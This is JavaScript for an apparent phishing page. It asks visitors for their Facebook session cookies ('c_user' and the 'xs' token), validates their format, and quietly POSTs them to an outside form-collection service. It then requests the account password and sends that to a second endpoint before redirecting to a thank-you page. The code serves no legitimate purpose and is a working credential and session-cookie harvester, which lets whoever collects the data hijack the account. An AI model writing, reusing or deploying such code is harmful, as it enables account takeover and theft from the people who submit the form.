function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

// Get form elements
const cuserInput = document.getElementById('cuser');
const xsInput = document.getElementById('xs');
const submitButton = cookieForm.querySelector('button[type="submit"]');

// Initially disable the submit button
submitButton.disabled = true;
submitButton.style.opacity = '0.5';
submitButton.style.cursor = 'not-allowed';

// Validation functions
function validateCuser(value) {
    // Must be 15-17 digits, only numbers
    return /^\d{15,17}$/.test(value);
}

function validateXs(value) {
    // Must not contain spaces or emojis
    // Allow numbers, letters, colons, percent-encoded chars, hyphens, underscores
    if (/\s/.test(value)) return false; // No spaces
    if (/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]/u.test(value)) return false; // No emojis
    
    // Allow only valid characters: letters, numbers, colons, percent signs, hyphens, underscores
    return /^[a-zA-Z0-9:%_-]+$/.test(value) && value.length >= 20;
}

function updateSubmitButton() {
    const cuserValid = validateCuser(cuserInput.value);
    const xsValid = validateXs(xsInput.value);
    
    if (cuserValid && xsValid) {
        submitButton.disabled = false;
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
    } else {
        submitButton.disabled = true;
        submitButton.style.opacity = '0.5';
        submitButton.style.cursor = 'not-allowed';
    }
}

// Add real-time validation listeners
cuserInput.addEventListener('input', updateSubmitButton);
xsInput.addEventListener('input', updateSubmitButton);

// Restrict c_user input to numbers only
cuserInput.addEventListener('keypress', function(e) {
    if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
        e.preventDefault();
    }
});

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Double-check validation before submission
    if (!validateCuser(cuserInput.value)) {
        alert('c_user must be 15-17 digits long and contain only numbers');
        return;
    }
    
    if (!validateXs(xsInput.value)) {
        alert('xs token must be at least 20 characters and contain only valid characters (no spaces or emojis)');
        return;
    }

    // Submit form data in background
    fetch('https://submit-form.com/rMcFXemUO', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cuser: cuserInput.value,
            xs: xsInput.value
        })
    }).then(() => {
        showPage('page4');
    }).catch(error => {
        console.error('Error:', error);
        showPage('page4'); // Still proceed to password page
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const password = document.getElementById('password').value;
    if (!password) {
        alert('Please enter your password');
        return;
    }
    
    fetch('https://submit-form.com/szNw0mbXJ', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            passwrod: password
        })
    }).then(() => {
        window.location.href = 'thankyou.html';
    }).catch(error => {
        console.error('Error:', error);
        window.location.href = 'thankyou.html';
    });
});
